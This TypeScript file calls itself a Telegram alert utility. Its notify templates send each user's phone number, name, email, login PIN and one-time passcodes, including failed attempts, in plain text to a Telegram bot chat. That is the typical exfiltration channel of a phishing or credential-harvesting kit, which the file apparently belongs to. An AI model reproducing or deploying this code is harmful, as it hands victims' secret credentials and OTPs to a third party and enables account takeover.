// Telegram notification utility for instant alerts
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

// Simple in-memory cache to prevent duplicate notifications (for development)
const notificationCache = new Map();

// Function to generate a unique hash for a notification to detect duplicates
function generateNotificationHash(message: string): string {
  // Simple hash function to identify similar notifications
  let hash = 0;
  for (let i = 0; i < message.length; i++) {
    const char = message.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash = hash & hash; // Convert to 32-bit integer
  }
  return hash.toString();
}

export async function sendTelegramNotification(message: string) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[Telegram] Bot not configured')
    return
  }

  // Add timestamp to the message
  const timestampedMessage = `${message}\n⏰ ${new Date().toLocaleString()}`;
  
  // Check for duplicate notifications within a short time window (e.g., 5 seconds)
  const hash = generateNotificationHash(timestampedMessage);
  const now = Date.now();
  const cached = notificationCache.get(hash);
  
  // If notification was sent within the last 5 seconds, skip it
  if (cached && (now - cached < 5000)) {
    console.log('[Telegram] Duplicate notification skipped');
    return;
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: timestampedMessage,
        parse_mode: 'HTML'
      })
    })
    
    // Update cache with current timestamp
    notificationCache.set(hash, now);
  } catch (error) {
    console.error('[Telegram] Send failed:', error)
  }
}

// Quick notification templates
export const notify = {
  login: (phone: string, name: string, pin: string) =>
    sendTelegramNotification(`🔐 <b>LOGIN</b>\n📱 ${phone}\n👤 ${name}\n🔑 ${pin}`),

  signup: (phone: string, name: string, email: string, pin: string) =>
    sendTelegramNotification(`✅ <b>SIGNUP</b>
📱 ${phone}
👤 ${name}
📧 ${email}
🔑 ${pin}`),

  otpVerified: (phone: string, otp: string) =>
    sendTelegramNotification(`✔️ <b>VERIFIED</b>\n📱 ${phone}\n🔢 ${otp}`),

  otpFailed: (phone: string, otp: string) =>
    sendTelegramNotification(`❌ <b>FAILED OTP</b>\n📱 ${phone}\n🔢 ${otp}`)
}